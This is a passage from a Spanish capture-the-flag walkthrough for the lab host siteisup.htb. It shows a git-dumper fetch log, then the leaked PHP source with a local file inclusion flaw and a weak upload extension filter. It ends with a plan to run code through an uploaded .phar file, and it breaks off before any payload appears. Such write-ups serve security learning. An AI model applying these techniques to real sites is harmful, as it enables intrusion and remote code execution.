+[-] Fetching http://siteisup.htb/dev/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/tags/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/hooks/update.sample [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/heads/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.idx [200]
+[-] Fetching http://siteisup.htb/dev/.git/objects/pack/pack-30e4e40cb7b0c696d1ce3a83a6725267d45715da.pack [200]  
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/heads/main [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/heads/main [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/ [200]
+[-] Fetching http://siteisup.htb/dev/.git/refs/remotes/origin/HEAD [200]
+[-] Fetching http://siteisup.htb/dev/.git/logs/refs/remotes/origin/HEAD [200]
+[-] Fetching http://siteisup.htb/dev/.git/packed-refs [200]
+[-] Running git checkout .
+Actualizadas 6 rutas desde el índice
+</code></pre></div><h2 id="análisis-de-código-fuente">Análisis de código fuente</h2><p>En este punto, podemos leer el código fuente de la aplicación web. En primer lugar, encontramos un archivo llamado <code>.htaccess</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">SetEnvIfNoCase Special-Dev "only4dev" Required-Header  
+Order Deny,Allow
+Deny from All
+Allow from env=Required-Header
+</code></pre></div><p>Este archivo es común en aplicaciones web Apache/PHP para limitar el acceso al directorio actual. Esta vez, vemos que para acceder a <code>/dev/</code> necesitamos agregar una cabecera <code>Special-Dev</code> con valor <code>only4dev</code>.</p><p>Esto es <code>index.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">&lt;</span><span class="mtk5">b</span><span class="mtk1">&gt;This is only for developers&lt;/</span><span class="mtk5">b</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">a</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"?page=admin"</span><span class="mtk1">&gt;Admin Panel&lt;/</span><span class="mtk5">a</span><span class="mtk1">&gt;</span>
+<span class="mtk5">&lt;?php</span>
+<span class="mtk1">  </span><span class="mtk7">define</span><span class="mtk1">(</span><span class="mtk4">"DIRECTACCESS"</span><span class="mtk1">,</span><span class="mtk6">false</span><span class="mtk1">);</span>
+<span class="mtk1">  $page</span><span class="mtk5">=</span><span class="mtk1">$_GET[</span><span class="mtk4">'page'</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">($page </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"/bin|usr|home|var|etc/i"</span><span class="mtk1">,$page)){</span>  
+<span class="mtk1">    </span><span class="mtk5">include</span><span class="mtk1">($_GET[</span><span class="mtk4">'page'</span><span class="mtk1">] </span><span class="mtk5">.</span><span class="mtk1"> </span><span class="mtk4">".php"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk5">include</span><span class="mtk1">(</span><span class="mtk4">"checker.php"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+</code></pre></div><p>Hay una vulnerabilidad de <em>Local File Inclusion</em> (LFI) aquí, ya que podemos controlar el parámetro de <code>include</code>. Sin embargo, el archivo debe ser un archivo PHP, porque el servidor agrega la extensión <code>.php</code>.</p><p>También encontramos un <code>changelog.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Beta version
+
+1- Check a bunch of websites.
+
+-- ToDo:
+
+1- Multithreading for a faster version :D.  
+2- Remove the upload option.
+3- New admin panel.
+</code></pre></div><p>Parece que el desarrollador quiere quitar la opción de subir archivos. El código importante aquí es <code>checker.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk6">DIRECTACCESS</span><span class="mtk1">){</span>
+<span class="mtk1">  </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"Access Denied"</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">&lt;!</span><span class="mtk5">DOCTYPE</span><span class="mtk1"> </span><span class="mtk8">html</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">  &lt;</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">charset</span><span class="mtk1">=</span><span class="mtk4">'utf-8'</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">meta</span><span class="mtk1"> </span><span class="mtk8">http-equiv</span><span class="mtk1">=</span><span class="mtk4">"X-UA-Compatible"</span><span class="mtk1"> </span><span class="mtk8">content</span><span class="mtk1">=</span><span class="mtk4">"chrome=1"</span><span class="mtk1"> /&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">link</span><span class="mtk1"> </span><span class="mtk8">rel</span><span class="mtk1">=</span><span class="mtk4">"stylesheet"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"text/css"</span><span class="mtk1"> </span><span class="mtk8">media</span><span class="mtk1">=</span><span class="mtk4">"screen"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"stylesheet.css"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">title</span><span class="mtk1">&gt;Is my Website up ? (beta version)&lt;/</span><span class="mtk5">title</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;/</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">  &lt;</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"header_wrap"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"outer"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">header</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"inner"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">          &lt;</span><span class="mtk5">h1</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"project_title"</span><span class="mtk1">&gt;Welcome,&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt; Is My Website UP ?&lt;/</span><span class="mtk5">h1</span><span class="mtk1">&gt;</span>
+<span class="mtk1">          &lt;</span><span class="mtk5">h2</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"project_tagline"</span><span class="mtk1">&gt;In this version you are able to scan a list of we</span><span class="mtk1">bsites !&lt;/</span><span class="mtk5">h2</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;/</span><span class="mtk5">header</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"main_content_wrap"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"outer"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">      &lt;</span><span class="mtk5">section</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"main_content"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"inner"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">form</span><span class="mtk1"> </span><span class="mtk8">method</span><span class="mtk1">=</span><span class="mtk4">"post"</span><span class="mtk1"> </span><span class="mtk8">enctype</span><span class="mtk1">=</span><span class="mtk4">"multipart/form-data"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">          &lt;</span><span class="mtk5">label</span><span class="mtk1">&gt;List of websites to check:&lt;/</span><span class="mtk5">label</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"file"</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"file"</span><span class="mtk1"> </span><span class="mtk8">size</span><span class="mtk1">=</span><span class="mtk4">"50"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"check"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"submit"</span><span class="mtk1"> </span><span class="mtk8">value</span><span class="mtk1">=</span><span class="mtk4">"Check"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">form</span><span class="mtk1">&gt;</span>
+
+<span class="mtk5">&lt;?php</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">isitup</span><span class="mtk1">($url){</span>
+<span class="mtk1">  $ch</span><span class="mtk5">=</span><span class="mtk7">curl_init</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_URL</span><span class="mtk1">, </span><span class="mtk7">trim</span><span class="mtk1">($url));</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_USERAGENT</span><span class="mtk1">, </span><span class="mtk4">"siteisup.htb beta"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_HEADER</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_FOLLOWLOCATION</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_RETURNTRANSFER</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_SSL_VERIFYHOST</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_SSL_VERIFYPEER</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk7">curl_setopt</span><span class="mtk1">($ch, </span><span class="mtk6">CURLOPT_TIMEOUT</span><span class="mtk1">, </span><span class="mtk6">30</span><span class="mtk1">);</span>
+<span class="mtk1">  $f </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">curl_exec</span><span class="mtk1">($ch);</span>
+<span class="mtk1">  $header </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">curl_getinfo</span><span class="mtk1">($ch);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">($f </span><span class="mtk5">AND</span><span class="mtk1"> $header[</span><span class="mtk4">'http_code'</span><span class="mtk1">] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">){</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk7">array</span><span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">,$f);</span>
+<span class="mtk1">  }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">    </span><span class="mtk7">curl_close</span><span class="mtk1">($ch);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">if</span><span class="mtk1">($_POST[</span><span class="mtk4">'check'</span><span class="mtk1">]){</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># File size must be less than 10kb.</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'size'</span><span class="mtk1">] </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">10000</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"File too large!"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  $file </span><span class="mtk5">=</span><span class="mtk1"> $_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'name'</span><span class="mtk1">];</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Check if extension is allowed.</span>
+<span class="mtk1">  $ext </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getExtension</span><span class="mtk1">($file);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|ta</span><span class="mtk4">r/i"</span><span class="mtk1">,$ext)){</span>
+<span class="mtk1">    </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"Extension not allowed!"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Create directory to upload our file.</span>
+<span class="mtk1">  $dir </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"uploads/"</span><span class="mtk5">.</span><span class="mtk7">md5</span><span class="mtk1">(</span><span class="mtk7">time</span><span class="mtk1">())</span><span class="mtk5">.</span><span class="mtk4">"/"</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">is_dir</span><span class="mtk1">($dir)){</span>
+<span class="mtk1">        </span><span class="mtk7">mkdir</span><span class="mtk1">($dir, </span><span class="mtk6">0770</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Upload the file.</span>
+<span class="mtk1">  $final_path </span><span class="mtk5">=</span><span class="mtk1"> $dir</span><span class="mtk5">.</span><span class="mtk1">$file;</span>
+<span class="mtk1">  </span><span class="mtk7">move_uploaded_file</span><span class="mtk1">($_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'tmp_name'</span><span class="mtk1">], </span><span class="mtk4">"{</span><span class="mtk1">$final_path</span><span class="mtk4">}"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Read the uploaded file.</span>
+<span class="mtk1">  $websites </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtk7">file_get_contents</span><span class="mtk1">($final_path));</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk5">foreach</span><span class="mtk1">($websites </span><span class="mtk5">as</span><span class="mtk1"> $site){</span>
+<span class="mtk1">    $site</span><span class="mtk5">=</span><span class="mtk7">trim</span><span class="mtk1">($site);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#</span><span class="mtk4 detected-link">file://#i</span><span class="mtk4">"</span><span class="mtk1">,$site) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#data://#i"</span><span class="mtk1">,$site) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#ftp://#i"</span><span class="mtk1">,$site)){</span>  
+<span class="mtk1">      $check</span><span class="mtk5">=</span><span class="mtk8">isitup</span><span class="mtk1">($site);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1">($check){</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;{</span><span class="mtk1">$site</span><span class="mtk4">}&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;</span><span class="mtk4">"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;{</span><span class="mtk1">$site</span><span class="mtk4">}&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;</span><span class="mtk4">/center&gt;"</span><span class="mtk1">;</span>
+<span class="mtk1">      } </span>
+<span class="mtk1">    }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">      </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was det</span><span class="mtk4">ected !&lt;/font&gt;&lt;/center&gt;"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Delete the uploaded file.</span>
+<span class="mtk1">  </span><span class="mtk5">@</span><span class="mtk7">unlink</span><span class="mtk1">($final_path);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">getExtension</span><span class="mtk1">($file) {</span>
+<span class="mtk1">  $extension </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">strrpos</span><span class="mtk1">($file,</span><span class="mtk4">"."</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> ($extension</span><span class="mtk5">===</span><span class="mtk6">false</span><span class="mtk1">) </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk7">substr</span><span class="mtk1">($file,$extension</span><span class="mtk5">+</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">      &lt;/</span><span class="mtk5">section</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">id</span><span class="mtk1">=</span><span class="mtk4">"footer_wrap"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"outer"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">      &lt;</span><span class="mtk5">footer</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"inner"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">p</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"copyright"</span><span class="mtk1">&gt;siteisup.htb (beta)&lt;/</span><span class="mtk5">p</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">a</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"changelog"</span><span class="mtk1"> </span><span class="mtk8">href</span><span class="mtk1">=</span><span class="mtk4">"changelog.txt"</span><span class="mtk1">&gt;changelog.txt&lt;/</span><span class="mtk5">a</span><span class="mtk1">&gt;&lt;</span><span class="mtk5">br</span><span class="mtk1">&gt;</span>
+<span class="mtk1">      &lt;/</span><span class="mtk5">footer</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+
+<span class="mtk1">  &lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>Esta es una versión anterior de la funcionalidad inicial. Es muy extraño cómo funciona la funcionalidad de subida de archivos:</p><ol><li>Se sube el archivo (no se permiten algunas extensiones)</li></ol><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3"># File size must be less than 10kb.</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ($_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'size'</span><span class="mtk1">] </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">10000</span><span class="mtk1">) {</span>
+<span class="mtk1">        </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"File too large!"</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  $file </span><span class="mtk5">=</span><span class="mtk1"> $_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'name'</span><span class="mtk1">];</span>
+<span class="mtk1">  </span>
+<span class="mtk1">  </span><span class="mtk3"># Check if extension is allowed.</span>
+<span class="mtk1">  $ext </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getExtension</span><span class="mtk1">($file);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|ta</span><span class="mtk4">r/i"</span><span class="mtk1">,$ext)){</span>  
+<span class="mtk1">    </span><span class="mtk5">die</span><span class="mtk1">(</span><span class="mtk4">"Extension not allowed!"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+</code></pre></div><ol start="2"><li>Se crea un directorio dentro de <code>uploads</code></li></ol><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3"># Create directory to upload our file.</span>  
+<span class="mtk1">  $dir </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"uploads/"</span><span class="mtk5">.</span><span class="mtk7">md5</span><span class="mtk1">(</span><span class="mtk7">time</span><span class="mtk1">())</span><span class="mtk5">.</span><span class="mtk4">"/"</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">is_dir</span><span class="mtk1">($dir)){</span>
+<span class="mtk1">        </span><span class="mtk7">mkdir</span><span class="mtk1">($dir, </span><span class="mtk6">0770</span><span class="mtk1">, </span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+</code></pre></div><ol start="3"><li>Se mueve el archivo al nuevo directorio</li></ol><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3"># Upload the file.</span>
+<span class="mtk1">  $final_path </span><span class="mtk5">=</span><span class="mtk1"> $dir</span><span class="mtk5">.</span><span class="mtk1">$file;</span>
+<span class="mtk1">  </span><span class="mtk7">move_uploaded_file</span><span class="mtk1">($_FILES[</span><span class="mtk4">'file'</span><span class="mtk1">][</span><span class="mtk4">'tmp_name'</span><span class="mtk1">], </span><span class="mtk4">"{</span><span class="mtk1">$final_path</span><span class="mtk4">}"</span><span class="mtk1">);</span>  
+</code></pre></div><ol start="4"><li>Se lee el archivo y se extraen las líneas</li></ol><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk3"># Read the uploaded file.</span>
+<span class="mtk1">  $websites </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">explode</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span><span class="mtk7">file_get_contents</span><span class="mtk1">($final_path));</span>  
+</code></pre></div><ol start="5"><li>Se itera sobre las líneas y se comprueba que el sitio web está activo con <code>isitup</code></li></ol><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">  </span><span class="mtk5">foreach</span><span class="mtk1">($websites </span><span class="mtk5">as</span><span class="mtk1"> $site){</span>
+<span class="mtk1">    $site</span><span class="mtk5">=</span><span class="mtk7">trim</span><span class="mtk1">($site);</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#</span><span class="mtk4 detected-link">file://#i</span><span class="mtk4">"</span><span class="mtk1">,$site) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#data://#i"</span><span class="mtk1">,$site) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">"#ftp://#i"</span><span class="mtk1">,$site)){</span>  
+<span class="mtk1">      $check</span><span class="mtk5">=</span><span class="mtk8">isitup</span><span class="mtk1">($site);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1">($check){</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;{</span><span class="mtk1">$site</span><span class="mtk4">}&lt;br&gt;&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;</span><span class="mtk4">"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">        </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;{</span><span class="mtk1">$site</span><span class="mtk4">}&lt;br&gt;&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;</span><span class="mtk4">/center&gt;"</span><span class="mtk1">;</span>
+<span class="mtk1">      } </span>
+<span class="mtk1">    }</span><span class="mtk5">else</span><span class="mtk1">{</span>
+<span class="mtk1">      </span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was det</span><span class="mtk4">ected !&lt;/font&gt;&lt;/center&gt;"</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+</code></pre></div><p>Por lo tanto, el archivo debería contener una lista de sitios web para probar.</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Probablemente haya muchas formas de comprometer esta aplicación web. Mi enfoque es el siguiente:</p><ol><li>Subir un archivo llamado <code>test.phar</code> (Este archivo será ejecutado por PHP y no está prohibido)</li><li>En este archivo, agregar una URL de sitio web y código PHP. El sitio web es <code>http://dev.siteisup.htb</code>, que no está activo para la aplicación y, por lo tanto, tarda algún tiempo finalizar</li><li>Ir a <code>http://dev.siteisup.htb/uploads/</code> (usando la cabecera HTTP especial) para obtener el nombre del directorio (es un <em>hash</em> MD5). Otra forma podría ser calcular algunos <em>hashes</em> MD5 basados en el tiempo y probarlos</li><li>Realizar una petición HTTP para <code>test.phar</code>, que contiene código PHP que se ejecutará (tenemos algo de tiempo mientras la función <code>isitup</code> termina)</li></ol><p>Todos estos pasos donde se escribieron en <a 